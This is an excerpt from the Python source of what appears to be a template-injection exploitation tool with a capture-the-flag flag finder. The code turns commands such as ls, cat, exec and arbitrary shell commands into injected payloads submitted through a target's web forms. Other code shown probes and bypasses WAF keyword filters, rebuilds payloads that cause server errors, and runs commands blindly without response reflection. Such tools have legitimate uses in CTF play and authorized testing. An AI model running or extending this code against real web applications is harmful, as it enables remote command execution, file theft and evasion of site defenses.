...
from .cracker import FullPayloadGen, EvalArgsModePayloadGen, Cracker, guess_python_version, guess_is_flask, STRING, make_expr_waf_not500, apply_waf_expr_func
...
def do_submit_cmdexec(
    ...
    Returns:
        str: 回显
    """
    payload, will_print, tree = None, None, None
    ...
    if cmd[0] == "@":
        ...
        if cmd.startswith("get-config"):
            ...
            generate_target = (EVAL, ((STRING, cmd[4:].strip()),))
        elif cmd.startswith("ls"):
            cmd = cmd.strip()
            if len(cmd) == 2:  # ls
                generate_target = (EVAL, ((STRING, "__import__('os').listdir()"),))
            else:  # ls xxx
                generate_target = (
                    EVAL,
                    ((STRING, f"__import__('os').listdir({repr(cmd[2:].strip())})"),),
                )
        elif cmd.startswith("cat"):
            filepath = cmd[3:].strip()
            generate_target = (
                EVAL,
                ((STRING, f"open({repr(filepath)}, 'r').read()"),),
            )
        elif cmd.startswith("exec"):
            statements = cmd[4:].strip()
            generate_target = (EVAL, ((STRING, f"exec({repr(statements)})"),))
        else:
            logger.info(
        ...
        generate_target = (OS_POPEN_READ, (cmd,))

    assert generate_target is not None
    gen_type, gen_args = generate_target
    if isinstance(full_payload_gen_like, FullPayloadGen):
        generated = full_payload_gen_like.generate_with_tree(gen_type, *gen_args)
        if generated is not None:
            payload, will_print, tree = generated
    else:
        payload, will_print = full_payload_gen_like.generate(gen_type, *gen_args)
    ...
    if (
        ...
        and isinstance(full_payload_gen_like, FullPayloadGen)
        and full_payload_gen_like.options.autofix_500.value == "enabled"
        and tree is not None
        and full_payload_gen_like.outer_pattern is not None
        and full_payload_gen_like.context_vars is not None
    ):
        logger.warning(
            "Payload returned [yellow bold]500[/], trying to repair bad expressions.",
            extra={"markup": True, "highlighter": None},
        )
        waf_expr_func = make_expr_waf_not500(
            submitter,
            tree,
            full_payload_gen_like.outer_pattern,
            full_payload_gen_like.context_vars,
        )
        apply_waf_expr_func(full_payload_gen_like, waf_expr_func)
        regenerated = full_payload_gen_like.generate_with_tree(gen_type, *gen_args)
        if regenerated is not None:
            payload, will_print, _ = regenerated
            logger.info(
                "Retry submit payload [blue]%s[/]",
                rich_escape(payload),
            )
            result = submitter.submit(payload)
            assert result is not None
...
def build_no_echo_full_payload_gen(
    submitter: Submitter,
    options: Options,
    callback=None,
) -> Optional[FullPayloadGen]:
    waf_func_gen = (
        KeywordWafFuncGen(
            submitter,
            options.waf_keywords,
            callback=callback,
            options=options,
        )
        if options.waf_keywords
        else WafFuncGen(submitter, callback=callback, options=options)
    )
    waf_func = waf_func_gen.generate()
    full_payload_gen = FullPayloadGen(waf_func, callback=callback, options=options)
    for probe in Cracker.shell_test_probes:
        payload, _ = full_payload_gen.generate(OS_POPEN_READ, probe.payload)
        if payload is None:
            continue
        result = submitter.submit(payload)
    ...
    payload, _ = full_payload_gen.generate(EVAL, (STRING, "0"))
...
class Job:
    def __init__(self, context: JobContext):
        ...
        self.no_echo_executor: Optional[NoEchoExecutor] = None

    def _should_require_response(self) -> bool:
        return not self.context.options.no_echo.enabled

    def _build_cmd_exec_func(self):
        if self.payload_generator is None or self.submitter is None:
            raise ValueError("Must call do_crack_pre() first")
        if self.context.options.no_echo.enabled:
            if self.no_echo_executor is None:
                self.no_echo_executor = NoEchoExecutor(
                    submitter=self.submitter,
                    payload_generator=self.payload_generator,
                    options=self.context.options.no_echo,
                )
            return self.no_echo_executor.execute
        return partial(
            do_submit_cmdexec,
            submitter=self.submitter,
    ...
    def _crack_no_echo(self, submitter: Submitter, options: Options):
        full_payload_gen = build_no_echo_full_payload_gen(submitter, options)
        if full_payload_gen is None:
            return None
        logger.info(
            "Proceeding with [yellow]no-echo crack[/] without response reflection",
            extra={"markup": True, "highlighter": None},
        )
        return full_payload_gen
    ...
    def _do_form_crack_pre(self) -> bool:
        ...
        for input_field in ctx.form["inputs"]:
            ...
            has_response = cracker.has_respond()
            if self._should_require_response() and not has_response:
                continue
            full_payload_gen = (
                cracker.crack()
                if has_response
                else self._crack_no_echo(submitter, cracker.options)
            )
            if full_payload_gen:
    ...
    def _do_form_eval_args_pre(self) -> bool:
        ...
        for input_field in ctx.form["inputs"]:
            ...
            if self._should_require_response() and not cracker.has_respond():
                continue
    ...
    def do_crack(self, exec_cmd: Optional[str] = None, find_flag: FindFlag = FindFlag.AUTO):
        if self.payload_generator is None or self.submitter is None:
            raise ValueError("Must call do_crack_pre() first")
        cmd_exec_func = self._build_cmd_exec_func()
        if find_flag != FindFlag.DISABLED and not self.context.options.no_echo.enabled:
    ...
    def execute_command(self, command: str) -> str:
        ...
        return self._build_cmd_exec_func()(command)
